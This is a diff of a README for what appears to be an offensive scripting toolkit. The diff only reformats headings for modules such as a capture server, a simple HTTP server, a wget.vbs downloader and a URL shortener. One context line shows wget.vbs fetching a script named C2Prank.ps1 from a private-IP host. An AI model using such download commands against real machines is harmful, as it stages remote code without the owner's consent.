@@ -1,5 +1,4 @@
-## Module Name
-   <b><i>CaptureServer.ps1</i></b>
+## CaptureServer.ps1
 
 |Function name|Description|Privileges|Notes|
 |---|---|---|---|
@@ -17,8 +16,7 @@ Start "http://192.168.1.72:80"
 
 <br />
 
-## Module Name
-   <b><i>Start-SimpleHTTPServer.ps1</i></b>
+## Start-SimpleHTTPServer.ps1
    
 |Function Name|Description|Privileges|Notes|
 |---|---|---|---|
@@ -35,8 +33,7 @@ Start-SimpleHTTPServer -Port "8080"
 
 <br />
 
-## Module Name
-   <b><i>wget.vbs</i></b>
+## wget.vbs
    
 |Script Name|Description|Privileges|Notes|
 |---|---|---|---|
@@ -53,8 +50,7 @@ cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 
 <br />
 
-## Module Name
-   <b><i>Invoke-ShortUrl.ps1</i></b>
+## Invoke-ShortUrl.ps1
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
